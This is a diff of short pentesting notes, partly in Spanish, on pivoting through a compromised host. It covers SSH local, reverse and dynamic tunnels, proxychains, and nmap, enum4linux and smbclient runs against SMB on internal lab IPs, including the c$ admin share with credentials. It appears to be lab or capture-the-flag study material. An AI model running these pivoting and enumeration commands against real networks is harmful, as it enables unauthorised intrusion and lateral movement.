@@ -1,12 +1,16 @@
-reverse tunnel: ssh -R 9050:localhost:22 kali@192.168.2.53
 local portforward ssh -L local_port:destination_server_ip:remote_port ssh_server_hostname
+reverse tunnel: ssh -R 9050:localhost:22 kali@192.168.2.53
 
-
-ssh -NfD
-9050 root@squid
+dynamic:ssh -NfD 9050 root@squid
+nano /etc/proxychains.conf (ultima linea puerto 9050)
 proxychains nmap -Pn -sT -v 192.168.3.3 -p 445
 proxychains enum4linux -S -u aita -p **** 192.168.3.3
-smbclient -U aita%pass -L //192.168.3.3
-smbclient -U aita%pass  //192.168.3.3/c$
+
+
+ssh root@ip_comprometida -L 0.0.0.0:445:ip_tercera:445
+nmap -Pn -sT -v localshot -p 445
+enum4linux -S -u aita -p kilo localhost
+smbclient -U aita%pass -L //localhost
+smbclient -U aita%pass  //localhost/c$
 
 
